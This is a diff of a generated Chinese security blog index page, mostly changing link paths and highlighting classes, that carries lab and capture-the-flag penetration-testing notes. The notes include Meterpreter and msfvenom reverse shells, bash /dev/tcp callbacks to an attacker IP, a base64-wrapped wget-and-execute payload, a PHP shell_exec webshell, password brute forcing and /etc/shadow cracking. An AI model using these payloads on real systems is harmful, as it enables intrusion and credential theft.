@@ -40,7 +40,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
 
@@ -48,9 +48,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+<link href="css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
@@ -183,7 +183,7 @@
       
         
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
+          <a href="" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -193,7 +193,7 @@
       
         
         <li class="menu-item menu-item-about">
-          <a href="/about" rel="section">
+          <a href="" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -203,7 +203,7 @@
       
         
         <li class="menu-item menu-item-tags">
-          <a href="/tags" rel="section">
+          <a href="" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -213,7 +213,7 @@
       
         
         <li class="menu-item menu-item-categories">
-          <a href="/categories" rel="section">
+          <a href="" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -223,7 +223,7 @@
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives" rel="section">
+          <a href="" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -264,7 +264,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/30/其他方法/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io2019/08/30/其他方法/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
@@ -283,7 +283,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/30/其他方法/" itemprop="url">其他方法</a></h1>
+                <a class="post-title-link" href="2019/08/30/其他方法/" itemprop="url">其他方法</a></h1>
         
 
         <div class="post-meta">
@@ -318,7 +318,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
+                  <a href="categories/安全/" itemprop="url" rel="index">
                     <span itemprop="name">安全</span>
                   </a>
                 </span>
@@ -358,7 +358,7 @@
         
           
             <h2 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h2><p>查看是否是某个cms,是否具有可以直接利用的漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url url --enumerate at --enumerate ap --enumerate u</span><br></pre></td></tr></table></figure>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">wpscan</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">url</span> <span class="comment">url</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enumerate</span> <span class="comment">at</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enumerate</span> <span class="comment">ap</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">enumerate</span> <span class="comment">u</span></span><br></pre></td></tr></table></figure>
 <p>利用弱点</p>
 <ul>
 <li>登录界面是否存在SQL注入</li>
@@ -367,7 +367,7 @@
 <li>backup.zip等文件</li>
 <li>是否存在弱口令</li>
 </ul>
-<h2 id="内核溢出"><a href="#内核溢出" class="headerlink" title="内核溢出"></a>内核溢出</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">searchexploit 服务器版本</span><br><span class="line">cd /usr/share/exploitdb/exploits/linux/local</span><br><span class="line">gcc 414.c -o shellcode</span><br><span class="line">upload /root/Desktop/shellcode</span><br><span class="line">chmod 777 shellcode</span><br><span class="line">./shellcode</span><br></pre></td></tr></table></figure>
+<h2 id="内核溢出"><a href="#内核溢出" class="headerlink" title="内核溢出"></a>内核溢出</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">searchexploit 服务器版本</span><br><span class="line">cd <span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/exploitdb/</span>exploits<span class="meta-keyword">/linux/</span>local</span><br><span class="line">gcc <span class="number">414.</span>c -o shellcode</span><br><span class="line">upload <span class="meta-keyword">/root/</span>Desktop/shellcode</span><br><span class="line">chmod <span class="number">777</span> shellcode</span><br><span class="line">./shellcode</span><br></pre></td></tr></table></figure>
 
           
         
@@ -416,7 +416,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/30/命令注入/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io2019/08/30/命令注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
@@ -435,7 +435,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/30/命令注入/" itemprop="url">命令注入</a></h1>
+                <a class="post-title-link" href="2019/08/30/命令注入/" itemprop="url">命令注入</a></h1>
         
 
         <div class="post-meta">
@@ -470,7 +470,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
+                  <a href="categories/安全/" itemprop="url" rel="index">
                     <span itemprop="name">安全</span>
                   </a>
                 </span>
@@ -510,7 +510,7 @@
         
           
             <h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>file查看文件类型</p>
-<h2 id="查看漏洞"><a href="#查看漏洞" class="headerlink" title="查看漏洞"></a>查看漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit playSMS</span><br><span class="line">cat /usr/share/exploitdb/platforms/php/webappps/42003.txt</span><br></pre></td></tr></table></figure>
+<h2 id="查看漏洞"><a href="#查看漏洞" class="headerlink" title="查看漏洞"></a>查看漏洞</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit playSMS</span><br><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>platforms<span class="regexp">/php/</span>webappps<span class="regexp">/42003.txt</span></span><br></pre></td></tr></table></figure>
 <p>文件上传漏洞,允许上传csv文件</p>
 <p>创建一个csv文件,然后用burpsuite改内容</p>
 <ol>
@@ -520,16 +520,16 @@
 <li>go</li>
 </ol>
 <h2 id="准备shell"><a href="#准备shell" class="headerlink" title="准备shell"></a>准备shell</h2><p>启动metasploit监听</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost ip</span><br><span class="line">msf exploit(handler) &gt; set lport 4444</span><br><span class="line">msf exploit(handler) &gt; set run</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="builtin-name">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="builtin-name">set</span> lhost ip</span><br><span class="line">msf exploit(handler) &gt; <span class="builtin-name">set</span> lport 4444</span><br><span class="line">msf exploit(handler) &gt; <span class="builtin-name">set</span> run</span><br></pre></td></tr></table></figure>
 <p>生成shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=ip lport=port -f elf &gt; /var/www/html/shell</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="attribute">lhost</span>=ip <span class="attribute">lport</span>=port -f elf &gt; /var/www/html/shell</span><br></pre></td></tr></table></figure>
 <p>启动apache</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
 <p>利用base64绕过防火墙</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;wget http://ip/sheell -O /tmp/shell&apos; | base64</span><br><span class="line">echo &apos;chmod 777 /tmp/shell&apos; | base64</span><br><span class="line">echo &apos;/tmp/shell&apos; | base64</span><br></pre></td></tr></table></figure>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> 'wget http:<span class="string">//ip/sheell</span> -O <span class="string">/tmp/shell</span>' | base64</span><br><span class="line"><span class="keyword">echo</span> 'chmod 777 <span class="string">/tmp/shell</span>' | base64</span><br><span class="line"><span class="keyword">echo</span> '<span class="string">/tmp/shell</span>' | base64</span><br></pre></td></tr></table></figure>
 <p>利用buspsuite修改filename内容</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> shell exec(base64_decode(<span class="string">'base64encodestring'</span>));<span class="keyword">die</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prem -l</span><br><span class="line">sudo perl -e &quot;exec &apos;/bin/sh&apos;&quot;</span><br><span class="line">bash -i</span><br></pre></td></tr></table></figure>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">prem</span> -l</span><br><span class="line"><span class="symbol">sudo</span> perl -e <span class="string">"exec '/bin/sh'"</span></span><br><span class="line"><span class="keyword">bash </span>-i</span><br></pre></td></tr></table></figure>
 
           
         
@@ -578,7 +578,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/30/暴力破解/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io2019/08/30/暴力破解/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
@@ -597,7 +597,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/30/暴力破解/" itemprop="url">暴力破解</a></h1>
+                <a class="post-title-link" href="2019/08/30/暴力破解/" itemprop="url">暴力破解</a></h1>
         
 
         <div class="post-meta">
@@ -632,7 +632,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
+                  <a href="categories/安全/" itemprop="url" rel="index">
                     <span itemprop="name">安全</span>
                   </a>
                 </span>
@@ -675,12 +675,12 @@
 <h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>启动metasploit</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use auxiliary/scanner/http/wordpress_login_enum</span><br><span class="line">msf auxiliary(wrodpress_login_enum) &gt; set username admin</span><br><span class="line">msf auxiliary(wrodpress_login_enum) &gt; set pass_file /usr/share/wordlists/dirb/commonlist.txt</span><br><span class="line">msf auxiliary(wrodpress_login_enum) &gt; set targeturi /secret</span><br><span class="line">msf auxiliary(wrodpress_login_enum) &gt; set rhost ip</span><br><span class="line">msf auxiliary(wrodpress_login_enum) &gt; run</span><br></pre></td></tr></table></figure>
 <p>wpscan枚举用户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --urlwww.example.com/secret --enumerate</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --urlwww.example.com<span class="built_in">/secret </span>--enumerate</span><br></pre></td></tr></table></figure>
 <h2 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h2><p>略</p>
 <h2 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h2><p>转换文件为john可以阅读的格式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; download /etc/shadow</span><br><span class="line">msf &gt; download /etc/passwd</span><br><span class="line">unshadow passwd shadow &gt;cracked</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; download <span class="regexp">/etc/</span>shadow</span><br><span class="line">msf &gt; download <span class="regexp">/etc/</span>passwd</span><br><span class="line">unshadow passwd shadow &gt;cracked</span><br></pre></td></tr></table></figure>
 <p>使用john破解密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john cracked</span><br></pre></td></tr></table></figure>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">john cracked</span></span><br></pre></td></tr></table></figure>
 <h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2>
           
         
@@ -729,7 +729,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/30/命令执行漏洞/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io2019/08/30/命令执行漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
@@ -748,7 +748,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/30/命令执行漏洞/" itemprop="url">命令执行漏洞</a></h1>
+                <a class="post-title-link" href="2019/08/30/命令执行漏洞/" itemprop="url">命令执行漏洞</a></h1>
         
 
         <div class="post-meta">
@@ -783,7 +783,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
+                  <a href="categories/安全/" itemprop="url" rel="index">
                     <span itemprop="name">安全</span>
                   </a>
                 </span>
@@ -823,20 +823,19 @@
         
           
             <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>外部程序执行系统命令,如PHP中的system,exec,shelll_exec等</p>
-<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>nmap ,nikto,dirb等</p>
-<p><img src="E:\blog\.deploy_git\images\sparta.PNG" alt="sparta"></p>
+<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>nmap ,nikto,dirb等<img src="E:\blog\source\_posts\命令执行漏洞\sparta.PNG" alt="sparta"></p>
 <h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>AVWS</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /tmp</span><br><span class="line">ls -alh /home</span><br><span class="line">uname -a</span><br><span class="line">ssh username@localhost #不需要身份验证</span><br><span class="line">ssh username@localhost sudo ufw disable#关闭防火墙</span><br></pre></td></tr></table></figure>
 <h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>攻击机启动监听端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 4444</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>
 <p>靶场机器反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@localhost sudo bash -i &gt; &amp; /dev/tcp/攻击机ip/4444 0&gt;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username<span class="variable">@localhost</span> sudo bash -i &gt; &amp; <span class="regexp">/dev/tcp</span><span class="regexp">/攻击机ip/</span><span class="number">4444</span> <span class="number">0</span>&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure>
 <h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>开启python简易http</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
 <p>下载木马文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@localhost sudo -l wget &quot;http://ip:port/shell.jsp&quot; -O /var/lib/tomcat8/webapps/ROOT/shell.jsp</span><br></pre></td></tr></table></figure>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@localhost sudo -l wget <span class="string">"http://ip:port/shell.jsp"</span> -O /var/<span class="class"><span class="keyword">lib</span>/<span class="title">tomcat8</span>/<span class="title">webapps</span>/<span class="title">ROOT</span>/<span class="title">shell</span>.<span class="title">jsp</span></span></span><br></pre></td></tr></table></figure>
 <h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>攻击机启动监听端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 4444</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>
 <p>靶场机器反弹shell</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 'bash -i &gt; &amp;/dev/tcp/攻击机ip/4444/ 0 &gt; &amp; 1' | bash</span><br></pre></td></tr></table></figure>
 <h2 id="hash破解"><a href="#hash破解" class="headerlink" title="hash破解"></a>hash破解</h2><p><a href="https://crackstation.net" target="_blank" rel="noopener">网站https://crackstation.net</a></p>
@@ -889,7 +888,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/30/WIFI破解/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io2019/08/30/WIFI破解/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
@@ -908,7 +907,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/30/WIFI破解/" itemprop="url">WIFI破解</a></h1>
+                <a class="post-title-link" href="2019/08/30/WIFI破解/" itemprop="url">WIFI破解</a></h1>
         
 
         <div class="post-meta">
@@ -943,7 +942,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
+                  <a href="categories/安全/" itemprop="url" rel="index">
                     <span itemprop="name">安全</span>
                   </a>
                 </span>
@@ -1036,7 +1035,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/30/FTP协议/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io2019/08/30/FTP协议/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
@@ -1055,7 +1054,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/30/FTP协议/" itemprop="url">FTP协议</a></h1>
+                <a class="post-title-link" href="2019/08/30/FTP协议/" itemprop="url">FTP协议</a></h1>
         
 
         <div class="post-meta">
@@ -1090,7 +1089,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
+                  <a href="categories/安全/" itemprop="url" rel="index">
                     <span itemprop="name">安全</span>
                   </a>
                 </span>
@@ -1190,7 +1189,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/30/SQL注入(X-Forwarded-For)/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io2019/08/30/SQL注入(X-Forwarded-For)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
@@ -1209,7 +1208,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/30/SQL注入(X-Forwarded-For)/" itemprop="url">SQL注入(X-Forwarded-For)</a></h1>
+                <a class="post-title-link" href="2019/08/30/SQL注入(X-Forwarded-For)/" itemprop="url">SQL注入(X-Forwarded-For)</a></h1>
         
 
         <div class="post-meta">
@@ -1244,7 +1243,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
+                  <a href="categories/安全/" itemprop="url" rel="index">
                     <span itemprop="name">安全</span>
                   </a>
                 </span>
@@ -1335,7 +1334,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/27/SQL注入/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io2019/08/27/SQL注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
@@ -1354,7 +1353,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/27/SQL注入/" itemprop="url">SQL注入</a></h1>
+                <a class="post-title-link" href="2019/08/27/SQL注入/" itemprop="url">SQL注入</a></h1>
         
 
         <div class="post-meta">
@@ -1389,7 +1388,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
+                  <a href="categories/安全/" itemprop="url" rel="index">
                     <span itemprop="name">安全</span>
                   </a>
                 </span>
@@ -1436,11 +1435,11 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request.raw -level 5 -risk 3 --dbs --dbms mysql --batch</span><br><span class="line">sqlmap -r requests.raw -level 5 -risk 3 -D database --tables  --dbms mysql --batch</span><br><span class="line">sqlmap -r requests.raw -level 5 -risk 3 -D database -T table --columns  --dbms mysql --batch</span><br><span class="line">sqlmap -r requests.raw -level 5 -risk 3 -D database -T table  -C column --dump  --dbms mysql --batch</span><br></pre></td></tr></table></figure>
 <h2 id="上传shell反弹权限"><a href="#上传shell反弹权限" class="headerlink" title="上传shell反弹权限"></a>上传shell反弹权限</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><h4 id="攻击机监听"><a href="#攻击机监听" class="headerlink" title="攻击机监听"></a>攻击机监听</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/hanlder</span><br><span class="line">msf exploit(hanlder) &gt; set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(hanlder) &gt; set lhost 攻击机ip</span><br><span class="line">msf exploit(hanlder) &gt; set lport 4444</span><br><span class="line">msf exploit(hanlder) &gt; run</span><br></pre></td></tr></table></figure>
 <h4 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a>生成反弹shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=ip lport=port -f raw</span><br></pre></td></tr></table></figure>
-<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><h4 id="kali自带的"><a href="#kali自带的" class="headerlink" title="kali自带的"></a>kali自带的</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/webshell</span><br></pre></td></tr></table></figure>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><h4 id="kali自带的"><a href="#kali自带的" class="headerlink" title="kali自带的"></a>kali自带的</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/usr/share/webshell</span></span><br></pre></td></tr></table></figure>
 <p>修改host和port</p>
-<h3 id="nc监听端口"><a href="#nc监听端口" class="headerlink" title="nc监听端口"></a>nc监听端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp port</span><br></pre></td></tr></table></figure>
+<h3 id="nc监听端口"><a href="#nc监听端口" class="headerlink" title="nc监听端口"></a>nc监听端口</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc -lnvp port</span></span><br></pre></td></tr></table></figure>
 <p>美化终端</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
 <h2 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h2><p>使用</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
 <p>查看敏感文件</p>
@@ -1493,7 +1492,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/24/ssh泄露/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io2019/08/24/ssh泄露/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
@@ -1512,7 +1511,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/24/ssh泄露/" itemprop="url">ssh泄露</a></h1>
+                <a class="post-title-link" href="2019/08/24/ssh泄露/" itemprop="url">ssh泄露</a></h1>
         
 
         <div class="post-meta">
@@ -1547,7 +1546,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
+                  <a href="categories/安全/" itemprop="url" rel="index">
                     <span itemprop="name">安全</span>
                   </a>
                 </span>
@@ -1648,7 +1647,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/24/Smb (server message block)信息泄露/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io2019/08/24/Smb (server message block)信息泄露/">
 
